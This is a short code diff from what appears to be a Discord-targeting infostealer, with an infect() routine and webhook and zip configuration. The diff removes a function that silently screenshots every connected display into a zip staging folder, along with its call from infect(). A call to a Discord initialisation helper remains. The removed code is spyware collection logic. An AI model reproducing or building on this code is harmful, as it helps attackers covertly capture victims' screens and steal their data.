@@ -154,23 +154,7 @@ module.exports = (client) => {
             return obj
         },
 
-        async get_screenshot() {
-            client.requires.screenshot.listDisplays().then((displays) => {
-                var random_uuid = client.requires.crypto.randomUUID();
-                Object.entries(displays).forEach(async (key, value) => {
-                    client.config.counter.screenshots++;
-                    client.requires.screenshot({
-                        screen: key[1].id,
-                        format: "png",
-                        filename: `${client.config.jszip.path}/${random_uuid}_DISPLAY_${parseInt(key[0]) + 1}.png`
-                    });
-                })
-            });
-        },
-
         async infect() {
-            await this.get_screenshot(client.config.webhook.url)
-
             await client.utils.discord.init();
         }
     };
